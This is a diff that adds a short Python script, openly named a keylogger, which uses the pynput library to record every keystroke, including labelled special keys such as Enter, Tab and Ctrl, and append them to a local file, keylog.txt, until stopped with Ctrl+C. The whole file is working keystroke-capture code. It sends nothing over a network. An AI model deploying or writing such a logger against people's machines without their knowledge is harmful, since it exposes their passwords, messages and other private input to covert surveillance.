@@ -1,0 +1,34 @@
+from pynput.keyboard import Listener
+
+LOG_FILE = "keylog.txt"
+
+def on_press(key):
+    try:
+        # Log printable characters
+        with open(LOG_FILE, "a") as f:
+            f.write(key.char)
+    except AttributeError:
+        # Handle special keys like Enter, Space, etc.
+        special_keys = {
+            "Key.space": " [SPACE] ",
+            "Key.enter": " [ENTER]\n",
+            "Key.tab": " [TAB] ",
+            "Key.backspace": " [BACKSPACE] ",
+            "Key.shift": " [SHIFT] ",
+            "Key.ctrl_l": " [CTRL] ",
+            "Key.ctrl_r": " [CTRL] ",
+            "Key.alt_l": " [ALT] ",
+            "Key.alt_r": " [ALT] ",
+            "Key.esc": " [ESC] "
+        }
+        key_str = str(key).replace("'", "")
+        with open(LOG_FILE, "a") as f:
+            f.write(special_keys.get(key_str, f" [{key_str}] "))
+
+def main():
+    print("Keylogger is running... Press 'Ctrl + C' to stop.")
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
